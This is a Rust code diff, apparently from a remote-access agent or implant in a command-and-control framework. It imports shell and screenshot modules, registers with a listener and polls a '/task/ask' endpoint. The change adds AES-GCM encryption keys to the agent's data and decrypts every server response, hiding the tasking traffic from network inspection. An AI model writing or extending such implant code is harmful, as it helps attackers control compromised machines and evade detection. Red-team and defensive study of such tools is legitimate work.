@@ -12,6 +12,7 @@ use crate::{
         linux::shell::shell,
         screenshot::screenshot
     },
+    crypto::aesgcm::{encrypt, decrypt, encode, decode},
     utils::random::random_name, config::listener,
 };
 
@@ -35,7 +36,15 @@ pub async fn run(config: Config) -> Result<(), std::io::Error> {
         config.listener.port.to_owned(),
     );
 
-    let mut ra = AgentData::new(agent_name, hostname, os, arch, listener_url.to_string());
+    let mut ra = AgentData::new(
+        agent_name,
+        hostname,
+        os,
+        arch,
+        listener_url.to_string(),
+        config.key.to_string(),
+        config.nonce.to_string(),
+    );
     // let ra_json = serde_json::to_string(&ra).unwrap();
 
     // Initialize client
@@ -55,7 +64,10 @@ pub async fn run(config: Config) -> Result<(), std::io::Error> {
         {
             Ok(resp) => {
                 registered = true;
-                resp.text().await.unwrap()
+                let resp = resp.text().await.unwrap();
+                let decoded = decode(resp.as_bytes());
+                let decrypted = decrypt(&decoded, config.key.as_bytes(), config.nonce.as_bytes()).unwrap();
+                String::from_utf8(decrypted).unwrap()
             },
             Err(_) => continue,
         };
@@ -75,7 +87,10 @@ pub async fn run(config: Config) -> Result<(), std::io::Error> {
             .await
         {
             Ok(resp) => {
-                resp.text().await.unwrap()
+                let resp = resp.text().await.unwrap();
+                let decoded = decode(resp.as_bytes());
+                let decrypted = decrypt(&decoded, config.key.as_bytes(), config.nonce.as_bytes()).unwrap();
+                String::from_utf8(decrypted).unwrap()
             },
             Err(e) => {
                 println!("Error fetching /task/ask: {:?}", e);
